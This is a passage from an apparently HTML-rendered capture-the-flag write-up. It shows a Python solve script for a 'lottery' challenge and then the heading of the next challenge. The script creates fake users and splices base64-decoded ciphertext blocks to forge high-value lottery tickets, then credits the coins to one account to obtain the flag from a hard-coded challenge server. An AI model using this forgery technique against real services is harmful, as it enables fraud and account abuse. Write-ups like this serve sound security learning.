+</span></span><span class="line"><span class="cl"><span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">amount</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">9999</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fake_user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sheep</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">fake_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">treasure</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">sheep</span><span class="p">)[:</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">            <span class="n">b64decode</span><span class="p">(</span><span class="n">price</span><span class="p">)[</span><span class="mi">32</span><span class="p">:</span><span class="mi">96</span><span class="p">]</span> <span class="o">+</span> \
+</span></span><span class="line"><span class="cl">            <span class="n">b64decode</span><span class="p">(</span><span class="n">sheep</span><span class="p">)[</span><span class="mi">96</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">treasure</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">treasure</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">coin</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/info&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;enc&#39;</span><span class="p">:</span> <span class="n">treasure</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;info&#39;</span><span class="p">][</span><span class="s1">&#39;coin&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">amount</span> <span class="o">+=</span> <span class="n">coin</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/charge&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;coin&#39;</span><span class="p">:</span> <span class="n">coin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;enc&#39;</span><span class="p">:</span> <span class="n">treasure</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/flag&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="oh-my-socket"><a href="#oh-my-socket" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:oh-my-socket" class="headings">oh-my-socket</a></h2>
 <blockquote>
